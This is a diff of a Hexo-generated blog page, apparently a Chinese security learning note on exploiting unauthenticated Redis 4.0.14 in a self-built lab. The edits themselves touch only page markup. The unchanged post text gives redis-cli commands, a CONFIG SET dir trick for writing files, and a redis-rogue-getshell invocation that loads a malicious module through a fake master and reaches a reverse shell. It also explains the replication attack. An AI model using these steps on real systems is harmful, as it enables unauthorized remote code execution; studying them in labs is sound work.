@@ -7,20 +7,10 @@
   <meta http-equiv="expires" content="0">
   
   <title>Redis-unacc | Qexzi&#39;s Blog</title>
+  <link rel="canonical" href="https://Qexzi.github.io/2026/06/08/Redis4-unacc/">
   <meta name="author" content="Qexzi">
   
-  <meta name="description" content="1. 复现基础指令
-redis-cli -h 10.62.60.167 -p 8589   (自建靶场的ip与端口，默认是6397)ping -&amp;gt; pong 说明存在未授权keys *  打印所有的keyget mykey 测试读取set test1_key &amp;quot;This is test1_key&amp;quot; 测试写入info server 服务信息CONFIG GET dir 查询工作目录，RDB 文件、AOF 日志文件都会保存在这个目录下CONFIG GET dbfilename 查询RDB快照文件名称（内存快照）CONFIG GET rdbcompression 查询RDB快照文件是否开启压缩
-
-当前redis版本是4.0.14，是老版本了。 
-那就先做拉取数据库文件，然后本地解析
-BGSAVE 触发后台生成RDB快照，防止操作阻塞LASTSAVE 返回一个最新快照时间戳
-
-但是redis没有可供下载的地方，所以一般都是在线读信息，如果硬是要下载，就要寻在http文件下载端点，这个过程有点麻烦
-# 备份原有配置（后面必须恢复！）CONFIG GET dirCONFIG GET dbfilename# 修改保存目录（为下载端点目录）CONFIG SET dir &amp;quot;/var/www/html/....下载端点&amp;quot;CONFIG SET dbfilename &amp;quot;dump.rdb&amp;quot;# 触发快照，把rdb写入该目录BGSAVE
-
-
-所以还是利用modle进行getshell吧，攻击脚本：：https://github.com/vulhub/redis-rogue-getshell.git"> 
+  <meta name="description" content="网络安全学习笔记：Web 渗透、内网攻防、CTF、PWN 与计算机基础知识">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -33,6 +23,8 @@ BGSAVE 触发后台生成RDB快照，防止操作阻塞LASTSAVE 返回一个最�
   
 
   
+    <link rel="alternative" href="/atom.xml" title="Qexzi&#39;s Blog" type="application/atom+xml">
+  
   
     <link href="/zhuzhuxia.png" rel="icon">
   
@@ -43,7 +35,6 @@ BGSAVE 触发后台生成RDB快照，防止操作阻塞LASTSAVE 返回一个最�
   <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
   <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
@@ -51,41 +42,18 @@ BGSAVE 触发后台生成RDB快照，防止操作阻塞LASTSAVE 返回一个最�
 
   <!-- analytics -->
   
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-70812759-1');
-</script>
 
 
 
 
+  
 
+  
+  <!-- 结构化数据：帮助搜索引擎理解文章元信息 -->
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Redis-unacc","datePublished":"2026-06-08T04:00:00.000Z","dateModified":"2026-06-08T04:00:00.000Z","author":{"@type":"Person","name":"Qexzi"},"mainEntityOfPage":"https://Qexzi.github.io/2026/06/08/Redis4-unacc/","description":"1. 复现基础指令 redis-cli -h 10.62.60.167 -p 8589 (自建靶场的ip与端口，默认是6397)ping -&gt; pong 说明存在未授权keys * 打印所有的keyget mykey 测试读取set test1_key &quot;This is test1_key&quot; 测试写入info server 服务信息CONFIG GET dir 查询工作目"}</script>
+  
 
-<meta name="generator" content="Hexo 8.1.1"><script>
-MathJax = {
-  tex: {
-    inlineMath: [['$', '$'], ['\\(', '\\)']],
-    displayMath: [['$$', '$$'], ['\\[', '\\]']],
-    processEscapes: true,
-    processEnvironments: true
-  },
-  options: {
-    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-  },
-  startup: {
-    pageReady: () => {
-      return MathJax.startup.defaultPageReady();
-    }
-  }
-};
-</script>
-<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-</head>
+<meta name="generator" content="Hexo 8.1.1"></head>
 
  <body>  
   <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
@@ -157,10 +125,10 @@ MathJax = {
 		  <h2 id="1-复现"><a href="#1-复现" class="headerlink" title="1. 复现"></a>1. 复现</h2><p>基础指令</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 10.62.60.167 -p 8589   (自建靶场的ip与端口，默认是6397)</span><br><span class="line"></span><br><span class="line">ping -&gt; pong 说明存在未授权</span><br><span class="line"></span><br><span class="line">keys *  打印所有的key</span><br><span class="line">get mykey 测试读取</span><br><span class="line"><span class="built_in">set</span> test1_key <span class="string">&quot;This is test1_key&quot;</span> 测试写入</span><br><span class="line"></span><br><span class="line">info server 服务信息</span><br><span class="line">CONFIG GET <span class="built_in">dir</span> 查询工作目录，RDB 文件、AOF 日志文件都会保存在这个目录下</span><br><span class="line">CONFIG GET dbfilename 查询RDB快照文件名称（内存快照）</span><br><span class="line">CONFIG GET rdbcompression 查询RDB快照文件是否开启压缩</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/Redis4-unacc/image_1.png" alt="在这里插入图片描述"><br>当前redis版本是4.0.14，是老版本了。 </p>
+<p><img src="/images/Redis4-unacc/image_1.png" alt="Redis4-unacc·图1"><br>当前redis版本是4.0.14，是老版本了。 </p>
 <p>那就先做拉取数据库文件，然后本地解析</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BGSAVE 触发后台生成RDB快照，防止操作阻塞</span><br><span class="line">LASTSAVE 返回一个最新快照时间戳</span><br></pre></td></tr></table></figure>
-<p><img src="/images/Redis4-unacc/image_2.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/Redis4-unacc/image_2.png" alt="Redis4-unacc·图2"></p>
 <p>但是redis没有可供下载的地方，所以一般都是在线读信息，如果硬是要下载，就要寻在http文件下载端点，这个过程有点麻烦</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份原有配置（后面必须恢复！）</span></span><br><span class="line">CONFIG GET <span class="built_in">dir</span></span><br><span class="line">CONFIG GET dbfilename</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改保存目录（为下载端点目录）</span></span><br><span class="line">CONFIG SET <span class="built_in">dir</span> <span class="string">&quot;/var/www/html/....下载端点&quot;</span></span><br><span class="line">CONFIG SET dbfilename <span class="string">&quot;dump.rdb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发快照，把rdb写入该目录</span></span><br><span class="line">BGSAVE</span><br></pre></td></tr></table></figure>
 
@@ -168,7 +136,7 @@ MathJax = {
 <p>所以还是利用modle进行getshell吧，攻击脚本：：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell.git">https://github.com/vulhub/redis-rogue-getshell.git</a></p>
 <p>先进入exp处make一下</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\redis-master.py -r 10.62.60.167 -p 8589 -L 10.60.65.136 -P 8888 -f RedisModulesSDK/exp/exp.so -c <span class="string">&quot;ls&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/Redis4-unacc/image_3.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/Redis4-unacc/image_3.png" alt="Redis4-unacc·图3"></p>
 <p><strong>攻击原理分析：</strong><br>Redis 4.x 到 5.0.5 版本存在未授权访问，攻击者不用密码就能连上 Redis。</p>
 <p>攻击者自己搭一个假的 Redis 主节点，然后在目标 Redis 上敲命令，让目标主动变成这个假节点的从库。</p>
 <p>当主从开始全量同步的时候，目标会主动连接我们的恶意服务，把对方发过来的数据当成正常 RDB 快照写到本地磁盘，但我们发过去的根本不是正常的 Redis 数据，而是恶意的 so 动态库文件。</p>
@@ -179,7 +147,7 @@ MathJax = {
 <li>伪造主节点，传输exp.so</li>
 <li>加载exp.so，建立反弹shell</li>
 </ol>
-<p><strong>攻击逻辑：</strong><br><img src="/images/Redis4-unacc/image_4.png" alt="在这里插入图片描述"></p>
+<p><strong>攻击逻辑：</strong><br><img loading="lazy" decoding="async" src="/images/Redis4-unacc/image_4.png" alt="Redis4-unacc·图4"></p>
 <hr>
 <h2 id="2-Redis-主从模式"><a href="#2-Redis-主从模式" class="headerlink" title="2. Redis 主从模式"></a>2. Redis 主从模式</h2><p>Redis 主从模式，也叫主从复制或 master-replica 复制，是指一个 Redis 实例作为主节点（master）负责处理写请求和部分读请求，一个或多个从节点（replica，早期称 slave）通过配置 <code>replicaof</code> 或启动命令连接主节点，持续接收并执行主节点传播过来的写命令，从而保持数据副本与主节点大致一致；从节点默认是只读的（<code>replica-read-only yes</code>），这样可以把读流量分散到多个从节点，实现读写分离、读扩展、数据备份和一定程度的故障恢复能力。</p>
 <p>复制建立时，从节点会向主节点发送 <code>PSYNC</code> 命令并带上自己记录的复制 ID（replid）和复制偏移量（offset），主节点若判断可以进行部分重同步，就从复制积压缓冲区（repl-backlog）中把从节点缺失的那部分命令补发过去；如果无法部分重同步，则触发全量同步：主节点 fork 一个子进程生成当前数据的 RDB 快照，同时把生成期间新收到的写命令缓存起来，然后把 RDB 发送给从节点，从节点先清空自身数据并载入 RDB，再执行缓存中的增量命令，之后进入持续的命令传播阶段，主节点每执行一条写命令就异步发给所有从节点。</p>
@@ -403,6 +371,7 @@ MathJax = {
 <script src="/js/bootstrap.min.js"></script>
 <script src="/js/main.js"></script>
 <script src="/js/toc.js"></script>
+<script src="/js/reading.js"></script>
 <script src="/js/copy-code.js"></script>
 
    <script type="text/javascript">
